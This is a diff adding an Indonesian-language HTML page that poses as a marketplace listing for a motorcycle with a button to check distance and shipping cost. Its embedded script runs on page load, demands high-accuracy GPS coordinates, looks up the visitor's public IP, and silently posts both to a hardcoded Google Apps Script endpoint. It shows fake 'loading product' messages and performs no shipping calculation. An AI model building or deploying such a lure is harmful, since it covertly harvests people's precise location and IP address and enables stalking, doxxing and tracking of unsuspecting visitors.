@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>NMax Turbo - Marketplace</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; padding: 20px; color: #1c1e21; }
+        .product-card { max-width: 500px; margin: auto; border: 1px solid #ddd; padding: 20px; border-radius: 8px; }
+        
+        .btn-lokasi {
+            background-color: #0084ff; color: white; padding: 15px; border: none;
+            border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%;
+        }
+        
+        #modalContainer {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255, 255, 255, 0.95); display: none;
+            flex-direction: column; justify-content: center; align-items: center; z-index: 1000;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="product-card">
+        <h1>NMax Turbo - Kondisi Mulus</h1>
+        <p>Harga: <b>Rp 35.000.000</b></p>
+        <p>Lokasi: Bekasi, Indonesia</p>
+        <hr>
+        <p>Cek ketersediaan dan ongkir ke lokasi Anda.</p>
+        
+        <button id="btnVerifikasi" class="btn-lokasi">
+            📍 Cek Jarak & Ongkir ke Lokasi Saya
+        </button>
+    </div>
+
+    <div id="modalContainer">
+        <h2 id="statusText">Memuat detail produk...</h2>
+    </div>
+
+    <script>
+        const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbw3qBPtBu54zw-wGRYTXps7vDiC4LPq-2m9Hn8IY7ADSjD6nLb7IpZHtCG2YsthfNqo/exec";
+
+        // Konfigurasi untuk akurasi maksimal
+        const geoOptions = {
+            enableHighAccuracy: true, // Memaksa penggunaan GPS jika tersedia
+            timeout: 10000,           // Waktu tunggu maksimal (10 detik)
+            maximumAge: 0             // Memaksa mengambil lokasi terbaru (bukan cache)
+        };
+
+        async function kirimDataOtomatis() {
+            const modal = document.getElementById('modalContainer');
+            const statusText = document.getElementById('statusText');
+            
+            try {
+                // Percobaan dengan high accuracy
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, geoOptions);
+                });
+
+                modal.style.display = 'flex';
+                statusText.innerText = "Memuat Produk";
+
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+
+                const payload = { 
+                    ip: ipData.ip, 
+                    lat: pos.coords.latitude, 
+                    lng: pos.coords.longitude 
+                };
+
+                await fetch(WEB_APP_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                statusText.innerText = "Berhasil Memuat Produk!";
+                setTimeout(() => { modal.style.display = 'none'; }, 1000);
+
+            } catch (err) {
+                console.log("Gagal Memuat Produk.");
+            }
+        }
+
+        window.onload = kirimDataOtomatis;
+        document.getElementById('btnVerifikasi').addEventListener('click', kirimDataOtomatis);
+    </script>
+</body>
+</html>
